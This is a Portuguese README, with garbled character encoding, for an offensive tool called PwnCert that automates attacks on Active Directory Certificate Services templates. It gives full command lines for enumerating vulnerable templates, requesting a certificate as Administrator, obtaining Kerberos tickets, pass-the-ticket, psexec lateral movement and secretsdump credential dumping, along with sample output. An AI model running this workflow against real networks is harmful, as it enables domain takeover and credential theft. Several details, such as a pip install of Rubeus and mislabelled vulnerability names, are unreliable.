# PwnCert - Guia de Explora√ß√£o Autom√°tica

## üéØ Novo Recurso: Comando `auto`

A nova funcionalidade `auto` realiza explora√ß√£o **totalmente autom√°tica** de vulnerabilidades AD CS (ESC1-ESC10).

### Como Funciona

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                FLUXO DE EXPLORA√á√ÉO AUTOM√ÅTICA               ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

1. ENUMERA√á√ÉO COM NetExec
   ‚îî‚îÄ> Executa: nxc ldap <target> -u <user> -p <pass> -M certipy-find
   ‚îî‚îÄ> Captura templates vulner√°veis e CAs

2. AN√ÅLISE INTELIGENTE
   ‚îî‚îÄ> Detecta vulnerabilidades (ESC1, ESC3, ESC6, ESC8, etc)
   ‚îî‚îÄ> Extrai informa√ß√µes de CA e templates
   ‚îî‚îÄ> Identifica severidade (CRITICAL, HIGH, MEDIUM)

3. EXPLORA√á√ÉO AUTOM√ÅTICA
   ‚îî‚îÄ> Seleciona exploit apropriado baseado em vuln detectada
   ‚îî‚îÄ> Requisita certificado com par√¢metros corretos
   ‚îî‚îÄ> Extrai e autentica automaticamente

4. MOVIMENTA√á√ÉO LATERAL
   ‚îî‚îÄ> Gera ticket kirbi para uso posterior
   ‚îî‚îÄ> Salva log completo da explora√ß√£o
```

### Exemplo de Uso

#### B√°sico - Explora√ß√£o Autom√°tica Simples
```bash
python3 pwncert.py auto -u 'seu_usuario' -p 'sua_senha' -d corp.local 192.168.1.100
```

#### Com usu√°rio alvo espec√≠fico
```bash
python3 pwncert.py auto -u admin -p Pass123 -d domain.local --target-user Administrator 192.168.1.10
```

#### Com hash NTLM
```bash
python3 pwncert.py auto -u admin -H 'LM:NT' -d domain.local 192.168.1.10
```

#### Salvar log detalhado
```bash
python3 pwncert.py auto -u admin -p Pass123 -d domain.local --log exploit.log 192.168.1.100
```

#### Modo debug (mostra todos os comandos)
```bash
python3 pwncert.py auto -u admin -p Pass123 -d domain.local --debug 192.168.1.100
```

### O que a Automa√ß√£o Faz

#### 1Ô∏è‚É£ NetExec Enumeration
- Conecta ao LDAP do target
- Executa m√≥dulo `certipy-find`
- Identifica CAs e templates habilitados
- Detecta templates vulner√°veis

#### 2Ô∏è‚É£ An√°lise Inteligente
```
Output do NetExec:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ [*] Found vulnerable CA: corp-CA         ‚îÇ
‚îÇ [*] Template: User                       ‚îÇ
‚îÇ [*] ESC1 detected: SubjectAltName       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

An√°lise:
‚îú‚îÄ ESC1 (CRITICAL) - SubjectAltName
‚îú‚îÄ CA: corp-CA
‚îú‚îÄ Template: User
‚îî‚îÄ> Pode requisitar cert com SAN alternativo
```

#### 3Ô∏è‚É£ Explora√ß√£o ESC1 Autom√°tica
```
1. Requisitar certificado para Administrator
   ‚îî‚îÄ> -ca "corp-CA" -t "User" -a "Administrator"

2. Extrair PFX automaticamente
   ‚îî‚îÄ> Administrator.pfx obtido

3. Autenticar com certificado
   ‚îî‚îÄ> Gerar ticket kirbi

4. Ticket pronto para movimenta√ß√£o lateral
   ‚îî‚îÄ> Use com Rubeus/Impacket
```

#### 4Ô∏è‚É£ Detec√ß√£o Autom√°tica de Vulnerabilidades

A ferramenta detecta e explora automaticamente:

| ESC | Vulnerabilidade | Autom√°tico | 
|-----|-----------------|-----------|
| ESC1 | SubjectAltName Enrollment | ‚úÖ Sim |
| ESC2 | Any Purpose | ‚úÖ Sim |
| ESC3 | Enrollment Agent | ‚úÖ Sim |
| ESC4 | Permissions Weakness | ‚ö†Ô∏è Manual |
| ESC5 | PKI Object Permissions | ‚ö†Ô∏è Manual |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | ‚úÖ Sim |
| ESC7 | CA Access Control | ‚ö†Ô∏è Manual |
| ESC8 | NTLM Relay | ‚ö†Ô∏è Manual |
| ESC9 | No Managed Service Account | ‚úÖ Sim |
| ESC10 | OID Filtering Weakness | ‚ö†Ô∏è Manual |

### Sa√≠da Esperada

```
================================================================================
  PwnCert AUTO - Explora√ß√£o Totalmente Autom√°tica
================================================================================

[STEP 1/3] Executando enumera√ß√£o com NetExec...
[*] Executando NetExec scan em 192.168.1.100...
[+] NetExec scan conclu√≠do com sucesso

[STEP 2/3] Analisando vulnerabilidades e iniciando explora√ß√£o...
[+] Encontradas 2 vulnerabilidade(s):
  ESC1 (CRITICAL): Enrollment Agent - Subject Alternative Name (SAN)
  ESC6 (CRITICAL): EDITF_ATTRIBUTESUBJECTALTNAME2 registry key
[+] CAs identificadas: corp-CA, backup-CA
[+] Templates identificados: User, Administrator, WebServer
[*] Executando exploit ESC1 contra CA 'corp-CA' com template 'User'...
[+] Certificado obtido: Administrator.pfx
[*] Autenticando com certificado Administrator.pfx...
[+] Autentica√ß√£o bem-sucedida!
[+] Arquivo kirbi gerado. Use com Rubeus ou Impacket

[STEP 3/3] Salvando log...
[+] Log salvo em: pwncert_20251127_143022.log

================================================================================
  ‚úì EXPLORA√á√ÉO CONCLU√çDA COM SUCESSO!
================================================================================

Certificado obtido e autentica√ß√£o realizada para: Administrator
Voc√™ pode agora usar o ticket kirbi para movimenta√ß√£o lateral
```

### Usando o Certificado Obtido

Ap√≥s a explora√ß√£o autom√°tica, voc√™ tem um ticket kirbi que pode usar:

#### Com Rubeus
```bash
rubeus.exe ptt /ticket:base64ticket
```

#### Com Impacket
```bash
export KRB5CCNAME=./ticket.ccache
psexec.py -k -no-pass corp.local/Administrator@targethost
```

#### Extrair hash NTLM (Secretsdump)
```bash
secretsdump.py -pfx Administrator.pfx corp.local/Administrator@DC
```

### Classes e Fun√ß√µes Adicionadas

#### `CertAnalyzer`
- `parse_nxc_output()` - Analisa output do NetExec
- `identify_vulnerability()` - Identifica tipo de ESC

#### `AutoExploiter`
- `run_nxc_scan()` - Executa NetExec automaticamente
- `auto_exploit()` - Fluxo completo de explora√ß√£o
- Suporte para m√∫ltiplas vulnerabilidades

#### `VulnerabilityDetector`
- Padr√µes regex para 10 tipos de ESC
- Extra√ß√£o autom√°tica de CA/templates
- C√°lculo de severidade

### Requisitos

```bash
# Instalar depend√™ncias
pip install certipy-ad netexec

# Para explora√ß√£o completa
pip install impacket rubeus
```

### Dicas de Uso

1. **Sempre use modo debug em primeiro teste**
   ```bash
   python3 pwncert.py auto -u user -p pass -d domain --debug 192.168.1.10
   ```

2. **Salve logs para an√°lise posterior**
   ```bash
   python3 pwncert.py auto -u user -p pass -d domain --log results.log 192.168.1.10
   ```

3. **Especifique usu√°rio alvo se n√£o for Administrator**
   ```bash
   python3 pwncert.py auto -u user -p pass -d domain --target-user domain_admin 192.168.1.10
   ```

4. **Em caso de falha, tente manualmente**
   ```bash
   # Enumerar
   python3 pwncert.py find -u user -p pass -d domain --vulnerable -j
   
   # Requisitar
   python3 pwncert.py req -u user -p pass -d domain -ca CA-NAME -t TEMPLATE -a ADMIN
   
   # Autenticar
   python3 pwncert.py auth --pfx admin.pfx -d domain
   ```

### Troubleshooting

#### NetExec n√£o encontrado
```bash
pip install netexec
# ou
pip install netexec-ng
```

#### Timeout no NetExec
- Aumentar timeout: Editar `AutoExploiter.run_nxc_scan()` 
- Verificar conectividade com DC

#### Certificado n√£o obtido
- Verificar permiss√µes do usu√°rio
- Confirmar vulnerabilidade real com enumera√ß√£o manual
- Tentar especificar template diferente

#### Autentica√ß√£o falha
- Verificar se PFX foi gerado corretamente
- Confirmar formato do dom√≠nio
- Tentar com `-k` para gerar kirbi

---

**Desenvolvido por**: 0x13-ByteZer0  
**Vers√£o**: 2.0+Auto  
**√öltima atualiza√ß√£o**: 27/11/2025
